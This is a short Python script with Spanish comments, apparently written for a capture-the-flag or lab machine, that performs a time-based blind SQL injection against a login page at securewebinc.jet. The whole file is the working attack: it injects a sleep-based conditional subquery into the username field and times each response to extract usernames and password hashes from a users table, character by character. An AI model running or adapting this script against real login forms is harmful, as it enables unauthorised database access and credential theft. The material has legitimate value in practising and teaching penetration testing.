#!/user/bin/python3 

from pwn import *
import signal,sys,requests,string,time

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...")
    sys.exit(1)

#Ctrl+C 
signal.signal(signal.SIGINT,def_handler)

#Variables globales 
url = "http://www.securewebinc.jet/dirb_safe_dir_rf9EmcEIx/admin/dologin.php"
#letters = string.ascii_letters + string.digits + string.punctuation
letters = string.hexdigits
burp = {'http':'http://127.0.0.1:8080'}
    

if __name__ == '__main__':
    p1 = log.progress("SQLI")
    p1.status("Iniciando ataque de fuerza bruta")

    p2 = log.progress("BBDD: jetadmin, Tabla: users, Columns: ")
    time.sleep(2)

    columns=''
   
    for column in range(0,5):
        for position in range(65,100):
            for letter in letters:
                post_data={
                    'username':f'admin\' and if(substr((select group_concat(username,0x3a,password) from users),{position},1)=\'{letter}\',sleep(2),1)-- -',
                    'password':'probando'
                }
                p1.status(post_data['username'])
                inicio = time.time()
                requests.post(url,data=post_data)
                fin = time.time()

                if fin - inicio >= 2:
                    columns+=letter
                    p2.status(columns)
                    break
        columns+=' '
